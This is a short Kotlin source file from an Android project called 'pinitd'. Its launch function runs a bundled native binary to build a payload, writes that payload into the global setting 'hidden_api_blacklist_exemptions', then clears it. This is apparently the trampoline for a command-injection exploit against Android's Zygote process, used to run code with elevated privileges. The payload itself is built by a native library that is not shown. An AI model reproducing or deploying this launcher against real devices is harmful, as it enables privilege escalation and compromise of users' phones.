package im.agg.pinitd

import android.content.ContentValues
import android.content.Context
import android.provider.Settings
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.Thread.sleep

fun launch(context: Context) {
    // Path will end with "base.apk". Remove that and navigate to native library
    val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
    val binaryPath = basePath + "lib/arm64/libpinitd.so"
    Log.w("pinitd-trampoline", "Attempting to launch: $binaryPath")
    try {
        val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val payload = StringBuilder()
        var line = reader.readLine()
        while (line != null) {
            payload.append(line + "\n")
            line = reader.readLine()
        }

        Log.w("pinitd-trampoline", "Setting payload: $payload")
        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload.toString())
        Log.w("pinitd-trampoline", "Payload set")
        sleep(200)
        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", null)
        Log.w("pinitd-trampoline", "Trampoline complete")
    } catch (e: Exception) {
        Log.w("pinitd-trampoline", "Error: ${e.message}")
    }
}